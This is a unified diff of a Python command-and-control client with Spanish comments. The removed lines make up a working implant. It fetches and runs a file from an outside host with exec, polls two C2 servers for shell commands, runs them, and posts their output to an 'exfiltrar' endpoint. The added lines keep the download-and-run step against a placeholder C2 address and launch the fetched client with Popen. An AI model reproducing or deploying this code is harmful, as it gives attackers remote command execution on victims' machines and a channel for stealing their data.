@@ -1,56 +1,32 @@
 import requests
 import subprocess
+import threading
 import time
 
-# Direcciones de los servidores C2
-url_primero_c2 = "http://localhost:5000"
-url_segundo_c2 = "http://localhost:5001"
+url_servidor_c2_original = "http://direccion_servidor_c2_original"
 
-def descargar_y_ejecutar(url):
-    nombre_archivo = "cliente_mejorado.py"
-    
-    try:
-        respuesta = requests.get(url)
-        with open(nombre_archivo, "wb") as archivo:
-            archivo.write(respuesta.content)
-        print(f"Archivo {nombre_archivo} descargado correctamente.")
-        
-        #ejecutar el archivo descargado
-        exec(open(nombre_archivo).read())
-        print(f"Ejecutando {nombre_archivo}...")
-    except Exception as e:
-        print(f"Error al descargar o ejecutar {nombre_archivo}: {e}")
+def gestionar_conexion_con_c2(url_servidor):
+    while True:
+        # Ejemplo de gestión de conexión con el C2 (solicitar comandos, ejecutarlos y enviar resultados)
+        try:
+            # Este es solo un esquema; deberás adaptar la lógica específica de tu caso.
+            respuesta = requests.get(f"{url_servidor}/comando")
+            comando = respuesta.text
+            if comando:
+                # Aquí se ejecutaría el comando y se enviarían los resultados
+                print(f"Ejecutando comando: {comando}")
+                time.sleep(2)  # Simular tiempo de ejecución
+        except Exception as e:
+            print(f"Error: {e}")
+            time.sleep(10)
 
-# URL para descargar el cliente mejorado del primer servidor C2
-url_descarga = "http://poc.intrustservices.co/descargar_cliente"
+def descargar_y_ejecutar_cliente_mejorado():
+    url = f"{url_servidor_c2_original}/descargar_cliente_mejorado"
+    respuesta = requests.get(url)
+    with open("cliente_mejorado.py", "wb") as archivo:
+        archivo.write(respuesta.content)
+    subprocess.Popen(["python", "cliente_mejorado.py"])  # Usamos Popen para no bloquear la ejecución
 
-descargar_y_ejecutar(url_descarga)
-
-def ejecutar_y_enviar_resultado(url_servidor):
-    respuesta = requests.get(f"{url_servidor}/comando")
-    comando = respuesta.text
-
-    if comando.lower() == "exit":
-        return True
-
-    resultado_comando = subprocess.run(comando, shell=True, capture_output=True, text=True)
-    datos_a_exfiltrar = resultado_comando.stdout + resultado_comando.stderr
-
-    requests.post(f"{url_servidor}/exfiltrar", data=datos_a_exfiltrar.encode('utf-8'))
-    return False
-
-while True:
-    try:
-        # Comunicarse con el primer servidor C2 y procesar comandos
-        if ejecutar_y_enviar_resultado(url_primero_c2):
-            break
-        
-        # Comunicarse con el segundo servidor C2 y procesar comandos
-        if ejecutar_y_enviar_resultado(url_segundo_c2):
-            break
-
-        # Esperar antes de consultar nuevamente
-        time.sleep(10)
-    except Exception as e:
-        print(f"Error: {e}")
-        time.sleep(10)
+if __name__ == "__main__":
+    threading.Thread(target=descargar_y_ejecutar_cliente_mejorado).start()
+    threading.Thread(target=gestionar_conexion_con_c2, args=(url_servidor_c2_original,)).start()
